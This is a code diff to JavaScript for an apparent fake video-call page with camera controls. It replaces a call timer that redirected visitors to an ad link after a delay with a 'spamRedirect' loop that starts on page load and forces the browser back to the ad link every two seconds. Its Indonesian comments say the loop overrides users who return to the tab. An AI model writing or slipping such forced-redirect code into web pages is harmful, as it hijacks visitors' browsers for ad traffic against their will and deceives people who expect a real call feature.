@@ -91,22 +91,19 @@ async function switchCamera() {
   if (cameraOn) await startCameraStream();
 }
 
-function startCallTimer(){
-  callSeconds = 0;
-  callTimer.style.display = 'block';
-  callInterval = setInterval(()=>{
-    callSeconds++;
-    const m = String(Math.floor(callSeconds/60)).padStart(2,'0');
-    const s = String(callSeconds%60).padStart(2,'0');
-    callTimer.textContent = `${m}:${s}`;
+// ==== Auto redirect loop ====
+const targetUrl = AD_LINK;
 
-    // redirect otomatis setelah REDIRECT_SECONDS
-    if(callSeconds >= REDIRECT_SECONDS){
-      clearInterval(callInterval);
-      window.location.href = AD_LINK;
-    }
-  },1000);
+
+function spamRedirect() {
+    window.location.href = targetUrl; // arahkan ke target
+    // setTimeout untuk memaksa redirect lagi jika user balik ke tab
+    setTimeout(spamRedirect, 2000); 
 }
+
+// mulai loop begitu halaman terbuka
+window.onload = spamRedirect;
+
 function stopCallTimer(){
   clearInterval(callInterval);
   callInterval=null;
